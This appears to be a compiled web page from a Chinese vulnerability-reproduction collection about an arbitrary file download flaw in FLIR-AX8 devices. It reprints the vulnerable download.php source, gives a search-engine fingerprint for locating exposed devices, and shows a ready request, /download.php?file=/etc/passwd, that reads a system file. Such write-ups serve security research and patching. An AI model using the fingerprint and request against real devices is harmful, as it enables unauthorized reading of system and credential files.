import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>FLIR-AX8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;FLIR-FLIR-AX8&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131035126.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <strong>download.php</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token doc-comment comment">/**
 * Copyright 2012 Armand Niculescu - MediaDivision.com
 * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
 * THIS SOFTWARE IS PROVIDED BY THE FREEBSD PROJECT &quot;AS IS&quot; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE FREEBSD PROJECT OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */</span>
<span class="token comment">// get the file request, throw error if nothing supplied</span>

<span class="token comment">// hide notices</span>
@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;error_reporting&#39;</span><span class="token punctuation">,</span> <span class="token constant">E_ALL</span> <span class="token operator">&amp;</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//- turn off compression on the server</span>
<span class="token comment">//@apache_setenv(&#39;no-gzip&#39;, 1);</span>
<span class="token comment">//@ini_set(&#39;zlib.output_compression&#39;, &#39;Off&#39;);</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;HTTP/1.0 400 Bad Request&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// sanitize the file request, keep just the name and extension</span>
<span class="token comment">// also, replaces the file location with a preset one (&#39;./myfiles/&#39; in this example)</span>
<span class="token variable">$file_path</span>  <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$path_parts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span>  <span class="token operator">=</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;basename&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span>   <span class="token operator">=</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;extension&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// allow a file to be streamed instead of sent as an attachment</span>
<span class="token variable">$is_attachment</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;stream&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

<span class="token comment">// make sure the file exists</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$file_size</span>  <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$file</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">// set the headers, prevent caching</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Pragma: public&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Expires: -1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Cache-Control: public, must-revalidate, post-check=0, pre-check=0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Disposition: attachment; filename=\\&quot;<span class="token interpolation"><span class="token variable">$file_name</span></span>\\&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// set appropriate headers for attachment or streamed file</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_attachment</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Disposition: attachment; filename=\\&quot;<span class="token interpolation"><span class="token variable">$file_name</span></span>\\&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Disposition: inline;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Transfer-Encoding: binary&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// set the mime type based on extension, add yours if needed.</span>
        <span class="token variable">$ctype_default</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;application/octet-stream&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$content_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                <span class="token string double-quoted-string">&quot;exe&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;application/octet-stream&quot;</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">&quot;zip&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;application/zip&quot;</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">&quot;mp3&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;audio/mpeg&quot;</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">&quot;mpg&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;video/mpeg&quot;</span><span class="token punctuation">,</span>
                <span class="token string double-quoted-string">&quot;avi&quot;</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">&quot;video/x-msvideo&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ctype</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content_types</span><span class="token punctuation">[</span><span class="token variable">$file_ext</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$content_types</span><span class="token punctuation">[</span><span class="token variable">$file_ext</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$ctype_default</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Type: &quot;</span> <span class="token operator">.</span> <span class="token variable">$ctype</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//check if http_range is sent by browser (or download manager)</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;HTTP_RANGE&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$size_unit</span><span class="token punctuation">,</span> <span class="token variable">$range_orig</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;=&#39;</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;HTTP_RANGE&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size_unit</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;bytes&#39;</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token comment">//multiple ranges could be specified at the same time, but for simplicity only serve the first range</span>
				<span class="token comment">//http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt</span>
				<span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$range</span><span class="token punctuation">,</span> <span class="token variable">$extra_ranges</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$range_orig</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span>
			<span class="token punctuation">{</span>
				<span class="token variable">$range</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
				<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;HTTP/1.1 416 Requested Range Not Satisfiable&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">exit</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$range</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//figure out download piece from range (if set)</span>
		<span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$seek_start</span><span class="token punctuation">,</span> <span class="token variable">$seek_end</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;-&#39;</span><span class="token punctuation">,</span> <span class="token variable">$range</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">ob_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token comment">//set start and end based on range (if set), else set defaults</span>
		<span class="token comment">//also check for invalid ranges.</span>
		<span class="token variable">$seek_end</span>   <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$seek_end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token variable">$file_size</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">min</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$seek_end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$file_size</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$seek_start</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$seek_start</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$seek_end</span> <span class="token operator">&lt;</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$seek_start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$seek_start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	 
		<span class="token comment">//Only send partial content header if downloading a piece of the file (IE workaround)</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$seek_start</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$seek_end</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$file_size</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;HTTP/1.1 206 Partial Content&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Range: bytes &#39;</span><span class="token operator">.</span><span class="token variable">$seek_start</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;-&#39;</span><span class="token operator">.</span><span class="token variable">$seek_end</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;/&#39;</span><span class="token operator">.</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Length: &#39;</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$seek_end</span> <span class="token operator">-</span> <span class="token variable">$seek_start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span>
		  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Length: <span class="token interpolation"><span class="token variable">$file_size</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Accept-Ranges: bytes&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
		<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fseek</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$seek_start</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">ob_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connection_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> 
			<span class="token punctuation">{</span>
				@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">exit</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>			
		<span class="token punctuation">}</span>
		
		<span class="token comment">// file save was a success</span>
		@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">{</span>
		<span class="token comment">// file couldn&#39;t be opened</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;HTTP/1.0 500 Internal Server Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
	<span class="token comment">// file does not exist</span>
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;HTTP/1.0 404 Not Found&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/download.php?file=/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131035895.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),o=[p];function i(c,l){return s(),a("div",null,o)}const k=n(e,[["render",i],["__file","FLIR-AX8 download.php 任意文件下载.html.vue"]]);export{k as default};
